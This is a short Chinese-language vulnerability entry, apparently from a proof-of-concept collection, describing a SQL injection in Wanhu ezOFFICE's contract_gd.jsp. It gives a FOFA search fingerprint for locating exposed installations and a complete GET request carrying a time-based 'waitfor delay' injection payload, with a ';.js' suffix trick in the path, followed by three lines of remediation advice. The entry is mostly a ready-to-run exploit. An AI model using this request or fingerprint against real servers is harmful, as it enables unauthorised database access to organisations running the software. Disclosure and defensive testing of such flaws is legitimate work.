# 万户ezOFFICEcontract_gd.jspSQL注入

- **系统**：万户ezOFFICEcontract_gd.jsp　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27-- HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="万户网络-ezOFFICE"
2、隐患url,复现如下
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。